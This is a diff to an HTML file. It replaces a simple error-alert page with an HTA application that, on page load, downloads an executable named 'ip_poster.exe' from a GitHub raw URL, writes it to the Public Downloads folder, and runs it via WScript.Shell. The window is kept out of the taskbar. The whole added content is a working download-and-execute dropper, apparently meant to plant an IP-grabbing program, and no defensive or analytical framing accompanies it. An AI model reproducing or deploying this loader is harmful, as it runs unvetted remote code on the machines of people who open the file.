@@ -1,14 +1,40 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Error Message</title>
-    <script>
-        function showError() {
-            alert("An error has occurred! Please try again later.");
+    <title>Download and Run Application</title>
+    <hta:application id="app" 
+                     applicationname="DownloadAndRun" 
+                     border="thin" 
+                     showintaskbar="no" 
+                     maximizebutton="no" 
+                     minimizebutton="no" 
+                     windowstate="normal" />
+    <script language="javascript">
+        function downloadAndRun() {
+            var url = "https://raw.githubusercontent.com/DarkHvH/sitetest1/main/ip_poster.exe";
+            var exePath = "C:\\Users\\Public\\Downloads\\ip_poster.exe";  // You can change the path here
+
+            var objXMLHTTP = new ActiveXObject("MSXML2.XMLHTTP");
+            objXMLHTTP.open("GET", url, false);
+            objXMLHTTP.send();
+
+            var objADOStream = new ActiveXObject("ADODB.Stream");
+            objADOStream.Open();
+            objADOStream.Type = 1; // adTypeBinary
+            objADOStream.Write(objXMLHTTP.responseBody);
+            objADOStream.Position = 0;
+            objADOStream.SaveToFile(exePath, 2); // 2 means create or overwrite
+            objADOStream.Close();
+
+            // Execute the downloaded file
+            var objShell = new ActiveXObject("WScript.Shell");
+            objShell.Run(exePath, 1, true); // Run the EXE file
         }
-        showError();
+
+        window.onload = downloadAndRun;
     </script>
 </head>
 <body>
-    <!-- You can leave the body empty if not needed -->
+    <h1>Downloading and Running the Application...</h1>
 </body>
 </html>
